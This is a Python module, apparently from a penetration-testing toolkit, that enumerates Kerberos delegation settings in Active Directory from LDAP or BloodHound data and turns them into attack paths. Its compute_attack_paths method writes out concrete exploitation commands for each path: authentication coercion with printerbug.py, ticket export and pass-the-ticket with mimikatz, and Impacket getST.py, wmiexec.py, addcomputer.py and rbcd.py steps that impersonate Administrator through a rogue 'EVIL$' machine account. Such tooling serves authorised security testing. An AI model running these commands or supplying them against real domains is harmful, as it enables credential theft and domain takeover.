"""Active Directory delegation enumeration and abuse.

Enumerates and exploits Kerberos delegation configurations: unconstrained
delegation, constrained delegation (with/without protocol transition), and
resource-based constrained delegation (RBCD).

Each delegation type allows attackers to impersonate users to services,
escalating from standard domain user to domain admin through misconfigured
delegation trusts.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional

DELEGATION_FLAGS = {
    "WORKSTATION_TRUST_ACCOUNT": 0x1000,
    "SERVER_TRUST_ACCOUNT": 0x2000,
    "TRUSTED_FOR_DELEGATION": 0x80000,
    "TRUSTED_TO_AUTH_FOR_DELEGATION": 0x1000000,
    "NOT_DELEGATED": 0x100000,
}

UAC_TRUSTED_FOR_DELEGATION = 0x80000
UAC_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000
UAC_WORKSTATION_TRUST_ACCOUNT = 0x1000
UAC_SERVER_TRUST_ACCOUNT = 0x2000


@dataclass
class DelegationTarget:
    """A delegation-enabled account or computer.

    Attributes:
        sam_account_name: sAMAccountName.
        distinguished_name: DN in AD.
        object_sid: Security identifier.
        uac: userAccountControl flags integer.
        service_principal_names: List of SPNs.
        msds_allowed_to_delegate_to: Constrained delegation targets.
        msds_allowed_to_act_on_behalf_of_other_identity: RBCD SID.
        is_unconstrained: Has TRUSTED_FOR_DELEGATION flag.
        is_constrained: Has msDS-AllowedToDelegateTo entries.
        is_rbcd_target: Has msDS-AllowedToActOnBehalfOfOtherIdentity set.
        protocol_transition: Has TRUSTED_TO_AUTH_FOR_DELEGATION.
    """

    sam_account_name: str = ""
    distinguished_name: str = ""
    object_sid: str = ""
    uac: int = 0
    service_principal_names: list[str] = field(default_factory=list)
    msds_allowed_to_delegate_to: list[str] = field(default_factory=list)
    msds_allowed_to_act_on_behalf_of_other_identity: str = ""
    is_unconstrained: bool = False
    is_constrained: bool = False
    is_rbcd_target: bool = False
    protocol_transition: bool = False


@dataclass
class DelegationAttackPath:
    """A delegation-based attack path from source to target.

    Attributes:
        source_account: Account that can delegate.
        target_account: Account being delegated to.
        delegation_type: unconstrained, constrained, or rbcd.
        requires_compromise: What needs to be compromised first.
        severity: critical, high, medium, low.
        attack_steps: Ordered list of attack step descriptions.
        exploitation_commands: Shell commands to execute the attack.
    """

    source_account: str = ""
    target_account: str = ""
    delegation_type: str = ""
    requires_compromise: str = ""
    severity: str = "medium"
    attack_steps: list[str] = field(default_factory=list)
    exploitation_commands: list[str] = field(default_factory=list)


class DelegationEnumerator:
    """Enumerate Kerberos delegation configurations from Active Directory.

    Parses LDAP output, BloodHound data, or raw AD attributes to identify
    unconstrained delegation, constrained delegation, and RBCD targets.

    Attributes:
        domain: Target domain FQDN.
        raw_ldap_output: Raw LDAP search results text.
        targets: Discovered delegation targets.
        attack_paths: Computed attack paths.
    """

    def __init__(self, domain: str = "", raw_ldap_output: str = ""):
        self.domain = domain
        self.raw_ldap_output = raw_ldap_output
        self.targets: list[DelegationTarget] = []
        self.attack_paths: list[DelegationAttackPath] = []

    def enumerate_from_uac_flags(self, accounts: list[dict[str, Any]]) -> list[DelegationTarget]:
        """Enumerate delegation targets from parsed account data.

        Args:
            accounts: List of dicts with samaccountname, useraccountcontrol,
                serviceprincipalname, msds-allowedtodelegateto.

        Returns:
            List of DelegationTarget objects.
        """
        self.targets = []
        for acct in accounts:
            uac = acct.get("useraccountcontrol", 0)
            if isinstance(uac, str):
                try:
                    uac = int(uac)
                except (ValueError, TypeError):
                    uac = 0

            target = DelegationTarget(
                sam_account_name=acct.get("samaccountname", ""),
                distinguished_name=acct.get("distinguishedname", ""),
                object_sid=acct.get("objectsid", ""),
                uac=uac,
                service_principal_names=acct.get("serviceprincipalname", []) if isinstance(acct.get("serviceprincipalname"), list) else [acct.get("serviceprincipalname", "")],
            )

            target_props = acct.get("properties", {}) if isinstance(acct.get("properties"), dict) else {}
            allowed_to_delegate = target_props.get("msds-allowedtodelegateto", [])
            if isinstance(allowed_to_delegate, str):
                allowed_to_delegate = [allowed_to_delegate]
            target.msds_allowed_to_delegate_to = allowed_to_delegate
            target.msds_allowed_to_act_on_behalf_of_other_identity = target_props.get(
                "msds-allowedtoactonbehalfofotheridentity", ""
            )

            target.is_unconstrained = bool(uac & UAC_TRUSTED_FOR_DELEGATION)
            target.protocol_transition = bool(uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION)
            target.is_constrained = bool(target.msds_allowed_to_delegate_to)
            target.is_rbcd_target = bool(target.msds_allowed_to_act_on_behalf_of_other_identity)

            self.targets.append(target)

        return self.targets

    def parse_bloodhound_output(self, bloodhound_json: list[dict[str, Any]]) -> list[DelegationTarget]:
        """Parse BloodHound JSON output for delegation data.

        Args:
            bloodhound_json: List of BloodHound node/edge dicts.

        Returns:
            List of DelegationTarget objects.
        """
        self.targets = []
        for node in bloodhound_json:
            props = node.get("Properties", {}) if isinstance(node.get("Properties"), dict) else {}
            target = DelegationTarget(
                sam_account_name=props.get("name", props.get("samaccountname", "")),
                distinguished_name=props.get("distinguishedname", ""),
                object_sid=props.get("objectsid", ""),
                uac=props.get("useraccountcontrol", 0),
                is_unconstrained=props.get("unconstraineddelegation", False),
            )

            allowed = props.get("allowedtodelegate", [])
            if isinstance(allowed, list):
                target.msds_allowed_to_delegate_to = allowed

            target.is_constrained = bool(target.msds_allowed_to_delegate_to)

            self.targets.append(target)

        return self.targets

    def find_unconstrained_targets(self) -> list[DelegationTarget]:
        """Return all accounts with unconstrained delegation enabled.

        Returns:
            Filtered list of unconstrained delegation targets.
        """
        return [t for t in self.targets if t.is_unconstrained]

    def find_constrained_targets(self) -> list[DelegationTarget]:
        """Return all accounts with constrained delegation configured.

        Returns:
            Filtered list of constrained delegation targets.
        """
        return [t for t in self.targets if t.is_constrained]

    def find_rbcd_targets(self) -> list[DelegationTarget]:
        """Return all accounts with RBCD configured.

        Returns:
            Filtered list of RBCD targets.
        """
        return [t for t in self.targets if t.is_rbcd_target]

    def find_dc_targets(self) -> list[DelegationTarget]:
        """Return domain controllers with delegation configured.

        Returns:
            List of DC delegation targets.
        """
        return [
            t for t in self.targets
            if t.is_unconstrained or t.is_constrained
            if "DC=" in t.distinguished_name.upper()
        ]

    def compute_attack_paths(self) -> list[DelegationAttackPath]:
        """Compute delegation-based attack paths.

        Analyzes discovered targets to build attack chains:
        Unconstrained: Compromise DC/sensitive server -> capture TGTs from privileged users.
        Constrained: Compromise account with delegation -> impersonate to target services.
        RBCD: Create machine account -> configure RBCD -> impersonate arbitrary user.

        Returns:
            Ordered list of DelegationAttackPath by severity.
        """
        self.attack_paths = []

        for target in self.find_unconstrained_targets():
            path = DelegationAttackPath(
                source_account=target.sam_account_name,
                target_account="Any user authenticating to this host",
                delegation_type="unconstrained",
                requires_compromise=f"Admin access to {target.sam_account_name}",
                severity="critical" if "DC" in target.distinguished_name.upper() else "high",
                attack_steps=[
                    f"1. Compromise {target.sam_account_name} (unconstrained delegation enabled)",
                    "2. Force privileged user authentication (PrinterBug, PetitPotam, coerced auth)",
                    "3. Extract TGT from LSASS memory on the compromised host",
                    "4. Use extracted TGT for Pass-The-Ticket to any service",
                ],
                exploitation_commands=[
                    f"python3 printerbug.py {self.domain}/attacker@{target.sam_account_name} TARGET_DC",
                    f"mimikatz.exe \"sekurlsa::tickets /export\"",
                    f"mimikatz.exe \"kerberos::ptt ADMINISTRATOR.kirbi\"",
                ],
            )
            self.attack_paths.append(path)

        for target in self.find_constrained_targets():
            for delegate_to in target.msds_allowed_to_delegate_to:
                path = DelegationAttackPath(
                    source_account=target.sam_account_name,
                    target_account=delegate_to,
                    delegation_type="constrained",
                    requires_compromise=f"Credentials or hash of {target.sam_account_name}",
                    severity="high",
                    attack_steps=[
                        f"1. Obtain NTLM hash of {target.sam_account_name}",
                        f"2. Request S4U2self TGS for Administrator to {delegate_to}",
                        f"3. Inject the resulting service ticket (PTT)",
                        f"4. Access {delegate_to} as Administrator",
                    ],
                    exploitation_commands=[
                        f"getST.py -spn {delegate_to} -impersonate Administrator {self.domain}/{target.sam_account_name} -hashes :HASH",
                        "export KRB5CCNAME=Administrator.ccache",
                        f"wmiexec.py -k -no-pass {self.domain}/Administrator@{delegate_to.split('/')[1]}",
                    ],
                )
                self.attack_paths.append(path)

        for target in self.find_rbcd_targets():
            path = DelegationAttackPath(
                source_account=target.sam_account_name,
                target_account="Arbitrary user on target",
                delegation_type="rbcd",
                requires_compromise="Machine account quota + hash of controlled machine account",
                severity="critical",
                attack_steps=[
                    "1. Create a new machine account (or compromise existing one)",
                    f"2. Configure msDS-AllowedToActOnBehalfOfOtherIdentity on {target.sam_account_name}",
                    f"3. Request S4U2self ticket for Administrator to {target.sam_account_name}",
                    "4. Access the target as Administrator with the service ticket",
                ],
                exploitation_commands=[
                    "addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip DC_IP DOMAIN/USER",
                    f"rbcd.py -delegate-from 'EVIL$' -delegate-to '{target.sam_account_name}$' -dc-ip DC_IP -action write DOMAIN/USER",
                    f"getST.py -spn cifs/{target.sam_account_name} -impersonate Administrator -dc-ip DC_IP 'DOMAIN/EVIL$:Passw0rd!'",
                ],
            )
            self.attack_paths.append(path)

        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        self.attack_paths.sort(key=lambda p: severity_order.get(p.severity, 99))
        return self.attack_paths

    def summary(self) -> dict[str, Any]:
        """Return a summary of all delegation findings.

        Returns:
            Dict with counts, targets list, and computed attack paths.
        """
        return {
            "unconstrained_targets": len(self.find_unconstrained_targets()),
            "constrained_targets": len(self.find_constrained_targets()),
            "rbcd_targets": len(self.find_rbcd_targets()),
            "dc_targets": len(self.find_dc_targets()),
            "total_targets": len(self.targets),
            "attack_paths": [
                {
                    "type": p.delegation_type,
                    "source": p.source_account,
                    "target": p.target_account,
                    "severity": p.severity,
                    "requires": p.requires_compromise,
                }
                for p in self.compute_attack_paths()
            ],
        }
